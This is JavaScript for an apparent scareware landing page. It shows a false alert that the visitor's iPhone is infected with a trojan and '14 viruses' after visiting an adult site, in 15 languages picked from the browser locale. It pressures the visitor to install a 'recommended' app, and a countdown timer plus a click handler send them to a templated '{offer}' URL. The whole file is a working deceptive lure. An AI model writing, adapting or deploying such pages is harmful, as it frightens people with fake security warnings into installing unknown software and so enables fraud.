
document.addEventListener("DOMContentLoaded", function () {
    const step0 = document.getElementById("step0");
    const timerEl = document.getElementById("modal_timer_text");
    const banner = document.querySelector('.bottom-warning');
    const bg = document.querySelector('.screen-bg');
  
  if (!step0) return;

    let totalSeconds = 60;
    let timerStarted = false;
    let switched = false;
    let intervalId = null;

  const translations = {
    en: {
      modal_title_key: "Your Apple iPhone is infected with trojan virus!",
      modal_text_key: "Install the recommended mobile app immediately to ensure security.",
      modal_cancel_key: "Cancel",
      scan_now_option: "Install",
      warning_title_key: "Warning!",
      warning_time_key: "Now",
      warning_text_key: "You may have ",
      danger_span_key: "14 viruses",
      warning_text_key_last: " in your iPhone’s storage after visiting an adult website!",
      dismiss_key: "Dismiss",
      remove_key: "Remove",
    },
    fr: {
      modal_title_key: "Votre Apple iPhone est infecté par un virus trojan !",
      modal_text_key: "Installez immédiatement l'application mobile recommandée pour garantir la sécurité.",
      modal_cancel_key: "Annuler",
      scan_now_option: "Installer",
      warning_title_key: "Avertissement !",
      warning_time_key: "Maintenant",
      warning_text_key: "Vous pouvez avoir ",
      danger_span_key: "14 virus",
      warning_text_key_last: " dans le stockage de votre iPhone après avoir visité un site pour adultes !",
      dismiss_key: "Ignorer",
      remove_key: "Supprimer",
    },
    "pt-PT": {
      modal_title_key: "O seu Apple iPhone está infetado com um vírus trojan!",
      modal_text_key: "Instale imediatamente a aplicação móvel recomendada para garantir a segurança.",
      modal_cancel_key: "Cancelar",
      scan_now_option: "Instalar",
      warning_title_key: "Aviso!",
      warning_time_key: "Agora",
      warning_text_key: "Pode ter ",
      danger_span_key: "14 vírus",
      warning_text_key_last: " no armazenamento do seu iPhone após visitar um site para adultos!",
      dismiss_key: "Ignorar",
      remove_key: "Remover",
    },
    "pt-BR": {
      modal_title_key: "Seu Apple iPhone está infectado com um vírus trojan!",
      modal_text_key: "Instale imediatamente o aplicativo móvel recomendado para garantir a segurança.",
      modal_cancel_key: "Cancelar",
      scan_now_option: "Instalar",
      warning_title_key: "Aviso!",
      warning_time_key: "Agora",
      warning_text_key: "Você pode ter ",
      danger_span_key: "14 vírus",
      warning_text_key_last: " no armazenamento do seu iPhone após visitar um site adulto!",
      dismiss_key: "Ignorar",
      remove_key: "Remover",
    },
    es: {
      modal_title_key: "¡Tu Apple iPhone está infectado con un virus troyano!",
      modal_text_key: "Instala inmediatamente la aplicación móvil recomendada para garantizar la seguridad.",
      modal_cancel_key: "Cancelar",
      scan_now_option: "Instalar",
      warning_title_key: "¡Advertencia!",
      warning_time_key: "Ahora",
      warning_text_key: "Puede que tengas ",
      danger_span_key: "14 virus",
      warning_text_key_last: " en el almacenamiento de tu iPhone después de visitar un sitio para adultos!",
      dismiss_key: "Descartar",
      remove_key: "Eliminar",
    },
    "es-419": {
      modal_title_key: "¡Tu Apple iPhone está infectado con un virus troyano!",
      modal_text_key: "Instala de inmediato la aplicación móvil recomendada para garantizar la seguridad.",
      modal_cancel_key: "Cancelar",
      scan_now_option: "Instalar",
      warning_title_key: "¡Advertencia!",
      warning_time_key: "Ahora",
      warning_text_key: "Puede que tengas ",
      danger_span_key: "14 virus",
      warning_text_key_last: " en el almacenamiento de tu iPhone después de visitar un sitio para adultos!",
      dismiss_key: "Descartar",
      remove_key: "Eliminar",
    },
    da: {
      modal_title_key: "Din Apple iPhone er inficeret med en trojansk virus!",
      modal_text_key: "Installer straks den anbefalede mobilapp for at sikre sikkerheden.",
      modal_cancel_key: "Annuller",
      scan_now_option: "Installer",
      warning_title_key: "Advarsel!",
      warning_time_key: "Nu",
      warning_text_key: "Du kan have ",
      danger_span_key: "14 vira",
      warning_text_key_last: " i din iPhones lager efter at have besøgt en sexvideo-side!",
      dismiss_key: "Afvis",
      remove_key: "Fjern",
    },
    ja: {
      modal_title_key: "あなたのApple iPhoneはトロイの木馬ウイルスに感染しています！",
      modal_text_key: "安全を確保するために、推奨されるモバイルアプリを直ちにインストールしてください。",
      modal_cancel_key: "キャンセル",
      scan_now_option: "インストール",
      warning_title_key: "警告！",
      warning_time_key: "今",
      warning_text_key: "あなたのiPhoneには ",
      danger_span_key: "14個のウイルス",
      warning_text_key_last: " 成人向けサイトを訪問した後に保存されている可能性があります！",
      dismiss_key: "閉じる",
      remove_key: "削除",
    },
    fil: {
      modal_title_key: "Ang iyong Apple iPhone ay nahawahan ng trojan virus!",
      modal_text_key: "I-install agad ang inirerekomendang mobile app upang masiguro ang seguridad.",
      modal_cancel_key: "Kanselahin",
      scan_now_option: "I-install",
      warning_title_key: "Babala!",
      warning_time_key: "Ngayon",
      warning_text_key: "Maaaring mayroon kang ",
      danger_span_key: "14 na virus",
      warning_text_key_last: " sa storage ng iyong iPhone matapos bumisita sa isang adult na website!",
      dismiss_key: "I-dismiss",
      remove_key: "Alisin",
    },
    de: {
      modal_title_key: "Ihr Apple iPhone ist mit einem Trojaner-Virus infiziert!",
      modal_text_key: "Installieren Sie sofort die empfohlene mobile App, um die Sicherheit zu gewährleisten.",
      modal_cancel_key: "Abbrechen",
      scan_now_option: "Installieren",
      warning_title_key: "Warnung!",
      warning_time_key: "Jetzt",
      warning_text_key: "Möglicherweise haben Sie ",
      danger_span_key: "14 Viren",
      warning_text_key_last: " im Speicher Ihres iPhones, nachdem Sie eine Website für Erwachsene besucht haben!",
      dismiss_key: "Verwerfen",
      remove_key: "Entfernen",
    },
    nb: {
      modal_title_key: "Din Apple iPhone er infisert med et trojansk virus!",
      modal_text_key: "Installer umiddelbart den anbefalte mobilappen for å sikre sikkerheten.",
      modal_cancel_key: "Avbryt",
      scan_now_option: "Installer",
      warning_title_key: "Advarsel!",
      warning_time_key: "Nå",
      warning_text_key: "Du kan ha ",
      danger_span_key: "14 virus",
      warning_text_key_last: " i lagringen på din iPhone etter å ha besøkt et nettsted for voksne!",
      dismiss_key: "Avvis",
      remove_key: "Fjern",
    },
    sv: {
      modal_title_key: "Din Apple iPhone är infekterad med ett trojanskt virus!",
      modal_text_key: "Installera omedelbart den rekommenderade mobilappen för att säkerställa säkerheten.",
      modal_cancel_key: "Avbryt",
      scan_now_option: "Installera",
      warning_title_key: "Varning!",
      warning_time_key: "Nu",
      warning_text_key: "Du kan ha ",
      danger_span_key: "14 virus",
      warning_text_key_last: " i lagringen på din iPhone efter att ha besökt en webbplats för vuxna!",
      dismiss_key: "Avfärda",
      remove_key: "Ta bort",
    },
    it: {
      modal_title_key: "Il tuo Apple iPhone è infetto da un virus trojan!",
      modal_text_key: "Installa immediatamente l'app mobile consigliata per garantire la sicurezza.",
      modal_cancel_key: "Annulla",
      scan_now_option: "Installa",
      warning_title_key: "Avviso!",
      warning_time_key: "Ora",
      warning_text_key: "Potresti avere ",
      danger_span_key: "14 virus",
      warning_text_key_last: " nella memoria del tuo iPhone dopo aver visitato un sito per adulti!",
      dismiss_key: "Ignora",
      remove_key: "Rimuovi",
    },
    nl: {
      modal_title_key: "Je Apple iPhone is geïnfecteerd met een trojaans virus!",
      modal_text_key: "Installeer onmiddellijk de aanbevolen mobiele app om de veiligheid te garanderen.",
      modal_cancel_key: "Annuleren",
      scan_now_option: "Installeren",
      warning_title_key: "Waarschuwing!",
      warning_time_key: "Nu",
      warning_text_key: "Je kunt ",
      danger_span_key: "14 virussen",
      warning_text_key_last: " in de opslag van je iPhone hebben na het bezoeken van een website voor volwassenen!",
      dismiss_key: "Negeren",
      remove_key: "Verwijderen",
    },
    ro: {
      modal_title_key: "Apple iPhone-ul tău este infectat cu un virus troian!",
      modal_text_key: "Instalează imediat aplicația mobilă recomandată pentru a asigura securitatea.",
      modal_cancel_key: "Anulează",
      scan_now_option: "Instalează",
      warning_title_key: "Avertisment!",
      warning_time_key: "Acum",
      warning_text_key: "Este posibil să ai ",
      danger_span_key: "14 viruși",
      warning_text_key_last: " în stocarea iPhone-ului tău după ce ai vizitat un site pentru adulți!",
      dismiss_key: "Respinge",
      remove_key: "Elimină",
    },
  };

  const definedLanguages = [
    "en", "fr", "pt-PT", "pt-BR", "es", "es-419",
    "da", "ja", "fil", "de", "nb", "sv", "it", "nl", "ro"
  ];

  const currentLocale = (navigator && navigator.language) || "en";

  const getLocale = () => {
    if (translations[currentLocale]) return currentLocale;

    const shortLocale = currentLocale.slice(0, 2);
    if (translations[shortLocale]) return shortLocale;

    return "en";
  };

  const locale = getLocale();
  const t = translations[locale] || translations.en;

  document.documentElement.lang = locale;

  document.getElementById("modal_title_key").textContent = t.modal_title_key;
  document.getElementById("modal_text_key").textContent = t.modal_text_key;
  document.getElementById("modal_cancel_key").textContent = t.modal_cancel_key;
  document.getElementById("scan_now_option").textContent = t.scan_now_option;
  document.getElementById("warning_title_key").textContent = t.warning_title_key;
  document.getElementById("warning_time_key").textContent = t.warning_time_key;
  document.getElementById("warning_text_key").textContent = t.warning_text_key;
  document.getElementById("danger_span_key").textContent = t.danger_span_key;
  document.getElementById("warning_text_key_last").textContent = t.warning_text_key_last;
  document.getElementById("dismiss_key").textContent = t.dismiss_key;
  document.getElementById("remove_key").textContent = t.remove_key;

    function showStep(step) {
        step0.classList.remove("active");

        step.classList.add("active");
    }

    function renderTimer() {
        if (!timerEl) return;

        const minutes = String(Math.floor(totalSeconds / 60)).padStart(2, "0");
        const seconds = String(totalSeconds % 60).padStart(2, "0");
        timerEl.textContent = `${minutes}:${seconds}`;
    }

    function startTimer() {
        if (timerStarted) return;
        timerStarted = true;

        renderTimer();

         intervalId = setInterval(function () {
            if (totalSeconds <= 0) {
                clearInterval(intervalId);
                window.location.href = "{offer}";
                return;
            }

            totalSeconds -= 1;
            renderTimer();
        }, 1000);
    }

    showStep(step0);

    step0.addEventListener("click", function () {
        window.location.href = "{offer}";
    });

    if (timerEl) {
        renderTimer();

        setTimeout(function () {
            startTimer();
        }, 1550);
    }

if (banner && bg) {
    banner.addEventListener('animationend', () => {
        bg.classList.add('active');
    });
}
  
(function () {
  const ua = navigator.userAgent;
  const isIOS = /iPhone|iPad|iPod/i.test(ua);
  const isChrome = /CriOS/i.test(ua);

  if (isIOS && isChrome) {
    document.body.classList.add('ios-chrome');
  }
})();
});
